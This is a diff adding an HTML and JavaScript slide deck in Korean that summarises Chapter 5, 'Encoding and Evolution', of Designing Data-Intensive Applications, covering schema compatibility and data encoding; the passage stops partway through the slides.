@@ -1,0 +1,2747 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chapter 5 — Encoding and Evolution</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,600;9..144,900&family=Spectral:wght@400;600;800&family=JetBrains+Mono:wght@400;700&family=IBM+Plex+Sans+KR:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#ffffff;
+    --ink:#16130f;
+    --muted:#6b6155;
+    --line:#e4ddd1;
+    --paper:#faf7f0;
+    --accent:#c0392b;
+    --accent2:#1b6b6b;
+    --gold:#b8860b;
+    --blue:#2a5db0;
+    --green:#3a7d44;
+    --shadow:0 18px 50px -22px rgba(40,30,15,.32);
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    background:var(--bg);
+    color:var(--ink);
+    font-family:'IBM Plex Sans KR','Spectral',serif;
+    overflow:hidden;
+    -webkit-font-smoothing:antialiased;
+  }
+  /* ---------- Deck ---------- */
+  #deck{position:fixed;inset:0;}
+  .slide{
+    position:absolute;inset:0;
+    display:none;
+    padding:60px 84px 88px;
+    flex-direction:column;
+    background:var(--bg);
+    overflow:hidden;
+  }
+  .slide.active{display:flex;animation:slideIn .55s cubic-bezier(.2,.7,.2,1)}
+  @keyframes slideIn{from{opacity:0;transform:translateY(14px) scale(.992)}to{opacity:1;transform:none}}
+  .slide-inner{flex:1;display:flex;flex-direction:column;min-height:0;max-width:1180px;width:100%;margin:0 auto;overflow-y:auto;padding-right:6px}
+  .slide-inner::-webkit-scrollbar{width:7px}
+  .slide-inner::-webkit-scrollbar-thumb{background:var(--line);border-radius:9px}
+
+  /* corner motifs */
+  .slide::before{
+    content:"";position:absolute;top:30px;left:34px;width:30px;height:30px;
+    border-left:2px solid var(--accent);border-top:2px solid var(--accent);opacity:.5;
+  }
+  .slide::after{
+    content:"";position:absolute;bottom:30px;right:34px;width:30px;height:30px;
+    border-right:2px solid var(--accent);border-bottom:2px solid var(--accent);opacity:.5;
+  }
+
+  /* ---------- Typography ---------- */
+  .kicker{
+    font-family:'JetBrains Mono',monospace;font-size:12px;letter-spacing:.32em;
+    text-transform:uppercase;color:var(--accent);font-weight:700;margin-bottom:14px;
+    display:flex;align-items:center;gap:14px;
+  }
+  .kicker::after{content:"";flex:1;height:1px;background:linear-gradient(90deg,var(--line),transparent)}
+  h1{font-family:'Fraunces',serif;font-weight:900;font-size:clamp(34px,4.4vw,62px);line-height:1.04;letter-spacing:-.02em;margin-bottom:18px}
+  h2{font-family:'Fraunces',serif;font-weight:900;font-size:clamp(28px,3vw,42px);line-height:1.08;letter-spacing:-.015em;margin-bottom:8px}
+  h3{font-family:'Fraunces',serif;font-weight:600;font-size:21px;color:var(--ink);margin:14px 0 8px}
+  p,li{font-size:16.5px;line-height:1.72;color:#2c2620}
+  .lead{font-size:19px;color:var(--muted);line-height:1.7;font-family:'Spectral',serif}
+  strong{color:var(--accent);font-weight:700}
+  em{color:var(--accent2);font-style:normal;font-weight:600}
+  .scroll{overflow-y:auto;padding-right:14px;flex:1;min-height:0}
+  .scroll::-webkit-scrollbar{width:7px}
+  .scroll::-webkit-scrollbar-thumb{background:var(--line);border-radius:9px}
+
+  /* ---------- Layout helpers ---------- */
+  .cols{display:grid;grid-template-columns:1fr 1fr;gap:26px;align-items:start}
+  .cols3{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+  ul{list-style:none}
+  ul li{position:relative;padding-left:22px;margin:7px 0}
+  ul li::before{content:"▸";position:absolute;left:0;color:var(--accent);font-size:13px;top:3px}
+  ol{padding-left:20px}
+  ol li{margin:7px 0;padding-left:6px}
+  ol li::marker{color:var(--accent);font-weight:700;font-family:'JetBrains Mono',monospace}
+
+  .card{
+    background:var(--paper);border:1px solid var(--line);border-radius:14px;
+    padding:20px 22px;box-shadow:var(--shadow);
+  }
+  .card h3{margin-top:0}
+  .card.accent{border-left:4px solid var(--accent)}
+  .card.teal{border-left:4px solid var(--accent2)}
+  .card.gold{border-left:4px solid var(--gold)}
+  .card.blue{border-left:4px solid var(--blue)}
+  .pill{
+    display:inline-block;font-family:'JetBrains Mono',monospace;font-size:11px;
+    letter-spacing:.12em;text-transform:uppercase;padding:5px 11px;border-radius:999px;
+    background:var(--ink);color:#fff;font-weight:700;margin-bottom:10px
+  }
+  .pill.r{background:var(--accent)}
+  .pill.t{background:var(--accent2)}
+  .pill.g{background:var(--gold)}
+  .pill.b{background:var(--blue)}
+  .note{
+    background:#fff8e6;border:1px solid #ecd9a3;border-left:4px solid var(--gold);
+    padding:14px 18px;border-radius:10px;margin:14px 0;font-size:15px;line-height:1.66
+  }
+  .note b{color:var(--gold)}
+  figure{margin:16px 0;text-align:center}
+  figure img{max-width:100%;max-height:330px;border:1px solid var(--line);border-radius:10px;background:#fff;box-shadow:var(--shadow)}
+  figcaption{font-size:13px;color:var(--muted);margin-top:8px;font-family:'JetBrains Mono',monospace;letter-spacing:.04em}
+  /* 이미지 로드 실패 시 placeholder */
+  figure.img-missing{
+    position:relative;background:#fff8e6;border:2px dashed var(--gold);
+    border-radius:10px;padding:36px 24px;min-height:160px;
+    display:flex;align-items:center;justify-content:center;flex-direction:column;
+  }
+  figure.img-missing::before{
+    content:"🖼  이미지 " attr(data-file) " 를 불러올 수 없음";
+    display:block;font-family:'JetBrains Mono',monospace;font-size:13px;
+    color:var(--gold);font-weight:700;letter-spacing:.06em;margin-bottom:8px;
+  }
+  figure.img-missing::after{
+    content:"GitHub repo에 해당 파일을 업로드한 뒤 새로고침 필요";
+    display:block;font-family:'JetBrains Mono',monospace;font-size:11px;
+    color:var(--muted);position:static;width:auto;height:auto;border:none;
+    top:auto;right:auto;opacity:1;
+  }
+  figure.img-missing figcaption{margin-top:14px}
+
+  pre{
+    background:#1c1814;color:#e9e2d4;border-radius:12px;padding:18px 20px;
+    font-family:'JetBrains Mono',monospace;font-size:13.5px;line-height:1.7;
+    overflow-x:auto;margin:12px 0;border:1px solid #322a20
+  }
+  pre .c{color:#8a7f6a}
+  pre .k{color:#e0907a}
+  pre .s{color:#a9c98a}
+  pre .n{color:#9ec5e8}
+  .tag{display:inline-block;background:var(--accent);color:#fff;font-family:'JetBrains Mono',monospace;font-size:11px;padding:3px 9px;border-radius:6px;font-weight:700;letter-spacing:.06em}
+
+  table{border-collapse:collapse;width:100%;margin:12px 0;font-size:14.5px}
+  th,td{border:1px solid var(--line);padding:9px 13px;text-align:left}
+  th{background:var(--ink);color:#fff;font-family:'IBM Plex Sans KR';font-weight:600;font-size:13px}
+  tr:nth-child(even) td{background:var(--paper)}
+
+  .tradeoff{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line);border-radius:12px;overflow:hidden}
+  .tradeoff>div{padding:18px 20px}
+  .tradeoff .l{background:#fdeeec;border-right:1px solid var(--line)}
+  .tradeoff .r{background:#e9f4f4}
+  .tradeoff h4{font-family:'Fraunces';font-size:18px;margin-bottom:8px}
+
+  /* ---------- Title slide ---------- */
+  #s0{justify-content:center;align-items:flex-start;padding-left:110px}
+  #s0 .big{font-size:clamp(48px,7.6vw,118px);line-height:.95;font-family:'Fraunces';font-weight:900;letter-spacing:-.03em}
+  #s0 .big .o{-webkit-text-stroke:2px var(--ink);color:transparent}
+  #s0 .sub{font-family:'Spectral';font-size:22px;color:var(--muted);max-width:640px;margin-top:24px;line-height:1.6}
+  .quote-box{border-left:3px solid var(--accent);padding:6px 0 6px 24px;margin-top:34px;max-width:680px}
+  .quote-box p{font-family:'Spectral';font-style:italic;font-size:18px;color:#3a332a;line-height:1.7}
+  .quote-box cite{display:block;margin-top:10px;font-style:normal;font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--muted);letter-spacing:.06em}
+  .deco-num{position:absolute;right:-10px;bottom:-40px;font-family:'Fraunces';font-weight:900;font-size:380px;color:var(--paper);z-index:-1;line-height:1;user-select:none}
+
+  /* ---------- Navigation ---------- */
+  #nav{
+    position:fixed;bottom:24px;left:50%;transform:translateX(-50%);
+    display:flex;align-items:center;gap:16px;z-index:50;
+    background:rgba(255,255,255,.86);backdrop-filter:blur(10px);
+    border:1px solid var(--line);border-radius:999px;padding:8px 18px;box-shadow:var(--shadow)
+  }
+  #nav button{
+    border:none;background:var(--ink);color:#fff;width:34px;height:34px;border-radius:50%;
+    cursor:pointer;font-size:15px;display:flex;align-items:center;justify-content:center;
+    transition:transform .15s, background .15s
+  }
+  #nav button:hover{background:var(--accent);transform:scale(1.08)}
+  #nav button:disabled{opacity:.28;cursor:default;transform:none;background:var(--ink)}
+  #counter{font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--muted);min-width:74px;text-align:center;letter-spacing:.05em}
+  #progress{position:fixed;top:0;left:0;height:3px;background:linear-gradient(90deg,var(--accent),var(--gold));z-index:60;transition:width .4s ease}
+  #tocBtn{
+    position:fixed;top:22px;right:30px;z-index:55;background:var(--ink);color:#fff;border:none;
+    font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:.16em;padding:9px 16px;
+    border-radius:999px;cursor:pointer;text-transform:uppercase
+  }
+  #tocBtn:hover{background:var(--accent)}
+  /* TOC overlay */
+  #toc{
+    position:fixed;inset:0;background:rgba(252,250,245,.97);z-index:100;display:none;
+    padding:70px 80px;overflow-y:auto
+  }
+  #toc.open{display:block;animation:slideIn .4s}
+  #toc h2{font-size:34px;margin-bottom:30px}
+  .toc-grid{column-count:3;column-gap:42px}
+  .toc-item{
+    break-inside:avoid;display:flex;gap:12px;padding:9px 0;cursor:pointer;border-bottom:1px solid var(--line);
+    align-items:baseline;transition:color .15s
+  }
+  .toc-item:hover{color:var(--accent)}
+  .toc-item .n{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--accent);font-weight:700;min-width:30px}
+  .toc-item .t{font-size:14.5px;line-height:1.4}
+  #tocClose{position:absolute;top:30px;right:40px;background:none;border:1px solid var(--ink);border-radius:50%;width:42px;height:42px;font-size:18px;cursor:pointer}
+
+  .hint{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);letter-spacing:.1em}
+
+  /* ===== Animation widgets ===== */
+  .anim-stage{
+    background:var(--paper);border:1px solid var(--line);border-radius:14px;
+    padding:22px;margin:14px 0;box-shadow:var(--shadow)
+  }
+  .anim-ctrl{display:flex;gap:10px;align-items:center;margin-top:14px;flex-wrap:wrap}
+  .anim-ctrl button{
+    font-family:'JetBrains Mono',monospace;font-size:12px;letter-spacing:.08em;
+    background:var(--ink);color:#fff;border:none;padding:9px 16px;border-radius:8px;cursor:pointer;
+    text-transform:uppercase;transition:background .15s
+  }
+  .anim-ctrl button:hover{background:var(--accent)}
+  .anim-ctrl .status{font-family:'JetBrains Mono',monospace;font-size:12.5px;color:var(--accent2);font-weight:700}
+
+  /* Compat sim */
+  .compat-stage{display:grid;grid-template-columns:1fr 1fr;gap:18px;align-items:start}
+  .compat-box{background:#fff;border:1px solid var(--line);border-radius:12px;padding:16px}
+  .compat-box h4{font-family:'Fraunces';font-size:17px;margin-bottom:10px;display:flex;align-items:center;gap:8px}
+  .compat-fields{font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.85;background:#1c1814;color:#e9e2d4;padding:14px;border-radius:8px;min-height:120px}
+  .compat-fields .new{color:#a9c98a;background:rgba(169,201,138,.12);padding:2px 6px;border-radius:4px}
+  .compat-fields .lost{color:#e0907a;text-decoration:line-through;opacity:.7}
+  .compat-fields .preserved{color:#f0c674;border:1px dashed #b8860b;padding:1px 5px;border-radius:4px}
+  .compat-arrow{display:flex;align-items:center;justify-content:center;font-size:30px;color:var(--accent);font-family:'JetBrains Mono'}
+
+  /* Byte encoding compare */
+  .byte-grid{display:flex;gap:4px;flex-wrap:wrap;margin:10px 0;font-family:'JetBrains Mono',monospace;font-size:11px}
+  .byte{
+    min-width:34px;height:34px;border:1px solid var(--line);border-radius:6px;
+    display:flex;align-items:center;justify-content:center;
+    background:#fff;font-weight:700;transition:all .35s;position:relative
+  }
+  .byte.field{background:#fdeeec;color:var(--accent);border-color:var(--accent)}
+  .byte.value{background:#e9f4f4;color:var(--accent2);border-color:var(--accent2)}
+  .byte.meta{background:#fff8e6;color:var(--gold);border-color:var(--gold)}
+  .byte.tag{background:#1c1814;color:#fff;border-color:#1c1814}
+  .byte.highlight{transform:translateY(-4px);box-shadow:0 8px 14px -8px rgba(192,57,43,.4)}
+
+  .size-bar{display:flex;align-items:center;gap:14px;margin:10px 0}
+  .size-bar .bar-label{font-family:'JetBrains Mono',monospace;font-size:13px;min-width:160px;color:var(--ink);font-weight:700}
+  .size-bar .bar-track{flex:1;height:30px;background:#f3eee5;border-radius:6px;overflow:hidden;position:relative;border:1px solid var(--line)}
+  .size-bar .bar-fill{height:100%;display:flex;align-items:center;padding-left:10px;font-family:'JetBrains Mono',monospace;color:#fff;font-size:12px;font-weight:700;transition:width 1s cubic-bezier(.2,.7,.2,1)}
+  .size-bar.json .bar-fill{background:linear-gradient(90deg,var(--muted),#8a7f6a)}
+  .size-bar.mp .bar-fill{background:linear-gradient(90deg,var(--gold),#d4a73f)}
+  .size-bar.pb .bar-fill{background:linear-gradient(90deg,var(--accent2),#2d8c8c)}
+  .size-bar.av .bar-fill{background:linear-gradient(90deg,var(--accent),#e05a4a)}
+
+  /* Field tag simulator */
+  .schema-edit{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+  .schema-side{background:#1c1814;color:#e9e2d4;border-radius:10px;padding:14px;font-family:'JetBrains Mono',monospace;font-size:12.5px;line-height:1.85}
+  .schema-side .h{color:var(--gold);font-size:11px;letter-spacing:.12em;margin-bottom:6px;text-transform:uppercase}
+  .schema-side .add{background:rgba(169,201,138,.18);padding:1px 5px;border-radius:3px;color:#a9c98a}
+  .schema-side .del{background:rgba(224,144,122,.18);padding:1px 5px;border-radius:3px;color:#e0907a;text-decoration:line-through}
+  .schema-side .keep{color:#e9e2d4}
+
+  /* Avro reader/writer */
+  .avro-stage{display:grid;grid-template-columns:1fr auto 1fr;gap:18px;align-items:stretch}
+  .avro-col{background:#1c1814;color:#e9e2d4;border-radius:10px;padding:14px;font-family:'JetBrains Mono',monospace;font-size:12.5px;line-height:1.7}
+  .avro-col .h{color:var(--gold);font-size:11px;letter-spacing:.14em;margin-bottom:8px;text-transform:uppercase;font-weight:700}
+  .avro-mid{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:0 10px;font-family:'JetBrains Mono';color:var(--accent)}
+  .avro-row{padding:4px 6px;border-radius:4px;margin:2px 0;transition:all .35s}
+  .avro-row.matched{background:rgba(169,201,138,.18);color:#a9c98a}
+  .avro-row.skipped{background:rgba(224,144,122,.12);color:#e0907a;text-decoration:line-through;opacity:.7}
+  .avro-row.defaulted{background:rgba(240,198,116,.18);color:#f0c674;border:1px dashed #b8860b}
+
+  /* RPC compat */
+  .rpc-flow{display:grid;grid-template-columns:1fr auto 1fr;gap:10px;align-items:center;margin:14px 0}
+  .rpc-box{background:#fff;border:2px solid var(--line);border-radius:14px;padding:16px;text-align:center;transition:all .4s;position:relative}
+  .rpc-box.upgraded{border-color:var(--accent2);background:#e9f4f4}
+  .rpc-box.outdated{border-color:var(--gold);background:#fff8e6}
+  .rpc-box .role{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);letter-spacing:.14em;text-transform:uppercase}
+  .rpc-box .ver{font-family:'Fraunces';font-size:24px;font-weight:900;margin:6px 0}
+  .rpc-box .note{font-size:12px;color:var(--muted);margin:0;border:none;background:none;padding:0}
+  .rpc-mid{display:flex;flex-direction:column;align-items:center;gap:10px}
+  .rpc-arrow{font-family:'JetBrains Mono',monospace;font-size:14px;padding:8px 14px;border-radius:8px;background:#faf7f0;border:1px solid var(--line);min-width:200px;text-align:center;transition:all .35s}
+  .rpc-arrow.req{border-left:4px solid var(--accent2)}
+  .rpc-arrow.res{border-left:4px solid var(--gold)}
+  .rpc-arrow.live{background:var(--accent);color:#fff;border-color:var(--accent);transform:scale(1.04)}
+
+  /* Workflow / durable */
+  .wf-tasks{display:flex;gap:10px;flex-wrap:wrap;margin:14px 0;align-items:center}
+  .wf-task{
+    background:#fff;border:1.5px solid var(--line);border-radius:10px;padding:10px 14px;
+    font-family:'JetBrains Mono',monospace;font-size:13px;min-width:130px;text-align:center;
+    transition:all .35s;position:relative
+  }
+  .wf-task.done{background:#e9f4f4;border-color:var(--accent2);color:var(--accent2)}
+  .wf-task.done::before{content:"✓";position:absolute;top:-10px;right:-8px;background:var(--accent2);color:#fff;width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px}
+  .wf-task.running{background:#fff8e6;border-color:var(--gold);color:var(--gold);animation:pulseBox .8s infinite}
+  .wf-task.failed{background:#fdeeec;border-color:var(--accent);color:var(--accent)}
+  .wf-task.failed::before{content:"✗";position:absolute;top:-10px;right:-8px;background:var(--accent);color:#fff;width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px}
+  .wf-task.skipped{background:#f3eee5;border-style:dashed;color:var(--muted)}
+  .wf-task.skipped::before{content:"⤵ skip";position:absolute;top:-12px;right:-4px;background:var(--muted);color:#fff;padding:2px 7px;border-radius:10px;font-size:10px}
+  @keyframes pulseBox{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
+  .wf-arrow{color:var(--muted);font-family:'JetBrains Mono'}
+
+  .twocol-list{columns:2;column-gap:36px}
+  .twocol-list li{break-inside:avoid}
+  .mini{font-size:14px;color:var(--muted);line-height:1.6}
+  .arrowflow{display:flex;align-items:center;gap:10px;flex-wrap:wrap;font-family:'JetBrains Mono',monospace;font-size:13px;margin:12px 0}
+  .arrowflow .b{background:var(--paper);border:1px solid var(--line);padding:9px 14px;border-radius:8px}
+  .arrowflow .a{color:var(--accent);font-weight:700}
+
+  /* 슬라이드 본문 내 블록 요소 간 간격 일관화 */
+  .scroll > .card + .card,
+  .scroll > .card + .cols,
+  .scroll > .card + .cols3,
+  .scroll > .card + .tradeoff,
+  .scroll > .card + figure,
+  .scroll > .card + pre,
+  .scroll > .card + h3,
+  .scroll > .card + table,
+  .scroll > .card + .arrowflow,
+  .scroll > .cols + .card,
+  .scroll > .cols + .cols,
+  .scroll > .cols + .cols3,
+  .scroll > .cols + .tradeoff,
+  .scroll > .cols + figure,
+  .scroll > .cols + pre,
+  .scroll > .cols + h3,
+  .scroll > .cols + table,
+  .scroll > .cols + .note,
+  .scroll > .cols + p,
+  .scroll > .cols + .arrowflow,
+  .scroll > .cols3 + .card,
+  .scroll > .cols3 + .cols,
+  .scroll > .cols3 + .cols3,
+  .scroll > .cols3 + .tradeoff,
+  .scroll > .cols3 + figure,
+  .scroll > .cols3 + pre,
+  .scroll > .cols3 + h3,
+  .scroll > .cols3 + table,
+  .scroll > .cols3 + .note,
+  .scroll > .cols3 + p,
+  .scroll > .tradeoff + .card,
+  .scroll > .tradeoff + .cols,
+  .scroll > .tradeoff + .cols3,
+  .scroll > .tradeoff + .tradeoff,
+  .scroll > .tradeoff + figure,
+  .scroll > .tradeoff + pre,
+  .scroll > .tradeoff + h3,
+  .scroll > .tradeoff + table,
+  .scroll > .tradeoff + .note,
+  .scroll > .tradeoff + p,
+  .scroll > figure + .card,
+  .scroll > figure + .cols,
+  .scroll > figure + .cols3,
+  .scroll > figure + .tradeoff,
+  .scroll > figure + pre,
+  .scroll > figure + h3,
+  .scroll > figure + p,
+  .scroll > pre + .card,
+  .scroll > pre + .cols,
+  .scroll > pre + .cols3,
+  .scroll > pre + .tradeoff,
+  .scroll > pre + h3,
+  .scroll > pre + p,
+  .scroll > pre + figure,
+  .scroll > h3 + .card,
+  .scroll > h3 + .cols,
+  .scroll > h3 + .cols3,
+  .scroll > h3 + .tradeoff,
+  .scroll > h3 + figure,
+  .scroll > h3 + pre,
+  .scroll > h3 + p,
+  .scroll > table + h3,
+  .scroll > table + .card,
+  .scroll > table + .note,
+  .scroll > table + .cols,
+  .scroll > table + p,
+  .scroll > p + .card,
+  .scroll > p + .cols,
+  .scroll > p + .cols3,
+  .scroll > p + .tradeoff,
+  .scroll > p + figure,
+  .scroll > p + pre,
+  .scroll > p + h3,
+  .scroll > p + table,
+  .scroll > .arrowflow + .card,
+  .scroll > .arrowflow + .cols,
+  .scroll > .arrowflow + h3,
+  .scroll > .note + .card,
+  .scroll > .note + .cols,
+  .scroll > .note + .cols3,
+  .scroll > .note + .tradeoff,
+  .scroll > .note + h3,
+  .scroll > .note + p,
+  .scroll > .note + pre,
+  .scroll > .note + figure{
+    margin-top:18px;
+  }
+
+  /* cols/cols3/tradeoff 내부의 카드는 이미 grid gap이 처리하므로 별도 margin 불필요.
+     scroll 직계 자식에만 적용됨. */
+
+  @media (max-width:1100px){.slide{padding:46px 40px 84px}.cols,.cols3,.compat-stage,.schema-edit,.avro-stage,.rpc-flow{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div id="progress"></div>
+<button id="tocBtn">목차 ☰</button>
+<div id="deck"></div>
+
+<div id="toc">
+  <button id="tocClose">✕</button>
+  <h2>목차 — Encoding and Evolution</h2>
+  <div class="toc-grid" id="tocGrid"></div>
+</div>
+
+<nav id="nav">
+  <button id="prev">‹</button>
+  <span id="counter">01 / 01</span>
+  <button id="next">›</button>
+</nav>
+
+<script>
+/* ============================================================
+   SLIDES — Chapter 5: Encoding and Evolution
+   ============================================================ */
+const slides = [];
+
+/* ---- 0. Title ---- */
+slides.push({sec:"Intro", title:"표지", html:`
+<div class="slide-inner" style="justify-content:center">
+  <div class="kicker">Designing Data-Intensive Applications · 2E</div>
+  <div class="big">Chapter&nbsp;5<br><span class="o">Encoding</span> &amp; Evolution</div>
+  <div class="sub">데이터를 어떻게 인코딩하고, 시간이 지나며 변화에 어떻게 대응하는가</div>
+  <div class="quote-box">
+    <p>"모든 것은 변하고 멈춰 있는 것은 없음."</p>
+    <cite>— 에페소스의 헤라클레이토스, 플라톤 『크라틸로스』 (기원전 360년)</cite>
+  </div>
+  <div class="deco-num">5</div>
+</div>`});
+
+
+/* ---- 1. 변화는 필연 / 호환성 도입 ---- */
+slides.push({sec:"Intro", title:"변화는 필연이다", html:`
+<div class="kicker">Introduction</div>
+<h1>변화는 필연이다</h1>
+<div class="scroll">
+  <p class="lead">애플리케이션은 새 제품 출시, 기능 추가, 요구사항 변경 등으로 인해 <strong>필연적으로 변한다</strong>. 그래서 변화에 쉽게 적응할 수 있는 시스템을 만들어야 함.</p>
+
+  <div class="cols">
+    <div class="card accent">
+      <h3>핵심 문제 — 코드 변경은 즉각적이지 않다</h3>
+      <p>데이터 형식/스키마가 바뀌면 보통 애플리케이션 코드도 바뀌어야 함. 하지만 큰 애플리케이션에선 코드 변경이 즉각적으로 일어날 수 없음.</p>
+      <ul>
+        <li><b>서버 측</b> · 롤링 업그레이드 — 한 번에 조금씩만 배포하여 점진적으로 전체 노드에 적용</li>
+        <li><b>클라이언트 측</b> · 사용자가 한동안 업데이트를 하지 않을 수 있음</li>
+      </ul>
+    </div>
+    <div class="card teal">
+      <h3>결론 — 옛/새 버전이 공존</h3>
+      <p>구 버전과 새 버전의 코드와 데이터 형식이 시스템에 <strong>동시에 공존</strong>할 수 있음. 따라서 시스템이 계속 돌아가려면 <em>양방향 호환성</em>을 유지해야 함.</p>
+      <p class="mini">이는 API의 맥락에서도 마찬가지임.</p>
+    </div>
+  </div>
+
+  <h3>양방향 호환성</h3>
+  <div class="tradeoff">
+    <div class="l">
+      <span class="pill r">Backward</span>
+      <h4>하위 호환성</h4>
+      <p><strong>새 코드</strong>가 <em>옛 코드가 생성한 데이터</em>를 읽을 수 있음</p>
+      <p class="mini">보통 어렵지 않다 — 새 코드의 작성자는 옛 코드가 쓴 데이터 형식을 이미 알고 있기 때문에 명시적으로 처리 가능함. 필요하면 옛 데이터를 읽는 코드를 유지할 수도 있음.</p>
+    </div>
+    <div class="r">
+      <span class="pill t">Forward</span>
+      <h4>상위 호환성</h4>
+      <p><strong>옛 코드</strong>가 <em>새 코드가 생성한 데이터</em>를 읽을 수 있음</p>
+      <p class="mini">보통 어렵다 — 옛 코드가 새 버전이 추가한 것들을 무시할 수 있어야 함. (미래에 뭐가 추가될지 몰라 어려움)</p>
+    </div>
+  </div>
+</div>`});
+
+/* ---- 2. 상위 호환성 함정 ---- */
+slides.push({sec:"Intro", title:"상위 호환성의 함정", html:`
+<div class="kicker">Introduction</div>
+<h1>상위 호환성의 또 다른 함정</h1>
+<div class="scroll">
+<div class="cols" style="grid-template-columns:1.05fr 1fr">
+  <figure>
+    <img src="https://raw.githubusercontent.com/rlatls1997/books/refs/heads/master/Designing%20Data-Intensive%20Applications%202E/images/5-1.png" alt="상위 호환성 함정" onerror="this.style.display='none';this.parentNode.classList.add('img-missing');this.parentNode.dataset.file='5-1.png';">
+    <figcaption>그림 5-1 · 옛 코드의 읽기→수정→쓰기 사이클이 새 필드를 잃을 위험</figcaption>
+  </figure>
+  <div>
+    <div class="card accent">
+      <h3>시나리오</h3>
+      <ol>
+        <li>DB 스키마에 <strong>새 필드</strong>(photoURL)를 추가하고 새 코드가 이를 저장</li>
+        <li>옛 코드의 Person 클래스에는 photoURL 필드가 없음</li>
+        <li>옛 코드가 이 레코드를 <em>수정해서 다시 쓰면</em> 어떻게 될까?</li>
+      </ol>
+    </div>
+    <div class="card teal" style="margin-top:14px">
+      <h3>바람직한 동작</h3>
+      <p>옛 코드가 해석하지 못하더라도 새 필드를 <strong>그대로 보존(keep intact)</strong>해야 함.</p>
+    </div>
+    <div class="card gold" style="margin-top:14px">
+      <h3>위험</h3>
+      <p>새 필드가 존재하지 않는 옛 코드의 클래스로 디코딩되면, <strong>데이터 손실</strong>이 발생할 수 있음.</p>
+    </div>
+  </div>
+</div>
+<div class="note"><b>핵심 평가 기준</b> · 위와 같은 문제가 인코딩 형식을 평가하는 핵심 기준 중 하나가 됨.</div>
+
+<h3>이 장에서 다룰 내용</h3>
+<div class="cols3">
+  <div class="card"><b>여러 인코딩 형식</b><p class="mini">JSON, XML, Protocol Buffers, Avro</p></div>
+  <div class="card"><b>스키마 변경 대응</b><p class="mini">각 형식이 스키마 변경을 어떻게 다루는지, 옛/새 데이터·코드의 공존을 어떻게 지원하는지</p></div>
+  <div class="card"><b>저장 & 통신</b><p class="mini">각 형식이 데이터 저장과 통신에 어떻게 쓰이는지</p></div>
+</div>
+</div>`});
+
+/* ---- 3. ANIM: 호환성 시뮬레이터 ---- */
+slides.push({sec:"Intro", title:"애니메이션 · 호환성 시뮬레이터", anim:"compat", html:`
+<div class="kicker">Animation · Forward & Backward Compatibility</div>
+<h1>호환성 시뮬레이터 — 직접 깨뜨려 보기</h1>
+<p class="lead" style="margin-bottom:6px">옛 코드와 새 코드가 어떤 데이터를 만들고, 서로의 데이터를 어떻게 처리하는지 시나리오별로 시각화함.</p>
+<div class="anim-stage">
+  <div class="anim-ctrl" style="margin-top:0;margin-bottom:14px">
+    <button id="cBwd">▶ 하위 호환성 — 새 코드가 옛 데이터 읽기</button>
+    <button id="cFwd">▶ 상위 호환성 — 옛 코드가 새 데이터 읽기</button>
+    <button id="cTrap">⚠ 함정 — 옛 코드의 읽기→수정→쓰기</button>
+    <button id="cReset">↻ 리셋</button>
+  </div>
+  <div class="compat-stage">
+    <div class="compat-box">
+      <h4>📦 데이터 (DB / 메시지)</h4>
+      <div class="compat-fields" id="cData">{ 데이터 없음 }</div>
+    </div>
+    <div class="compat-box">
+      <h4>🧠 디코딩한 코드의 결과</h4>
+      <div class="compat-fields" id="cResult">시나리오를 선택하세요</div>
+    </div>
+  </div>
+  <p class="mini" id="cMsg" style="margin-top:14px;min-height:48px;color:var(--accent2);font-family:'JetBrains Mono',monospace;line-height:1.7">위 버튼으로 시나리오를 시작하세요.</p>
+</div>
+<div class="cols3" style="margin-top:6px">
+  <div class="card teal"><span class="pill t">하위 호환</span><p class="mini">새 코드가 옛 데이터를 읽을 때. 보통 어렵지 않다 — 어떤 옛 형식이 있었는지 알고 있으니까.</p></div>
+  <div class="card accent"><span class="pill r">상위 호환</span><p class="mini">옛 코드가 새 데이터를 읽을 때. 어렵다 — 옛 코드는 새 필드의 존재를 모름. 적어도 <b>무시</b>해야 함.</p></div>
+  <div class="card gold"><span class="pill g">함정</span><p class="mini">옛 코드가 새 데이터를 읽어서 객체로 만들고, 수정해서 다시 쓰면 — 알지 못하는 필드가 <b>증발</b>함.</p></div>
+</div>
+`});
+
+/* ---- 4. 인코딩 vs 디코딩 ---- */
+slides.push({sec:"Formats", title:"인코딩 vs 디코딩", html:`
+<div class="kicker">1. Formats for Encoding Data</div>
+<h1>인메모리 vs 바이트 시퀀스</h1>
+<div class="scroll">
+<p class="lead">프로그램은 보통 데이터를 두 가지 형태로 다룸.</p>
+
+<div class="cols">
+  <div class="card accent">
+    <h3>① In memory (메모리 내부)</h3>
+    <ul>
+      <li>객체, 구조체, 리스트, 배열, 해시테이블 등으로 보관</li>
+      <li>CPU가 효율적으로 접근하고 조작하도록 최적화 (보통 <strong>포인터</strong> 사용)</li>
+    </ul>
+  </div>
+  <div class="card teal">
+    <h3>② 파일에 쓰거나 네트워크로 보낼 때</h3>
+    <ul>
+      <li>데이터를 <strong>자기 완결적인(self-contained) 바이트 시퀀스</strong>로 인코딩 (ex. JSON 문서)</li>
+      <li>이렇게 인코딩된 바이트 시퀀스는 메모리에서 쓰던 자료구조와 상당히 다름</li>
+    </ul>
+  </div>
+</div>
+
